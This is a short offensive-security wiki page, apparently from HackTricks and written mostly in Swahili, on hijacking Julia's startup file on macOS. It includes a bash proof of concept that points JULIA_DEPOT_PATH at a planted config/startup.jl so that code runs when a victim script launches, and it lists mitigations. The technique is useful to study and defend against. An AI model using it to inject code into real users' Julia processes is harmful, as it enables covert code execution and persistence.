# macOS Julia Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## `JULIA_DEPOT_PATH` na `startup.jl`

Julia kwa kawaida hutekeleza `config/startup.jl` kutoka depot yake ya kwanza wakati wa startup. `JULIA_DEPOT_PATH` hudhibiti orodha ya depot, kwa hivyo kuielekeza kwenye tree inayoweza kusomwa na attacker huelekeza upya faili ya startup inayopakiwa kiotomatiki.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```
Kitenganishi cha mwisho ni muhimu wakati victim bado anahitaji packages zake za kawaida. `julia --startup-file=no` huzima startup file hii. Futa variable kabla ya kuanzisha kwa sababu pia inadhibiti package registries, environments, caches, na maeneo ya kupakia code.

## References

- [1] [Julia command-line interface: Startup file](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [2] [Julia environment variables: `JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)
{{#include ../../../banners/hacktricks-training.md}}
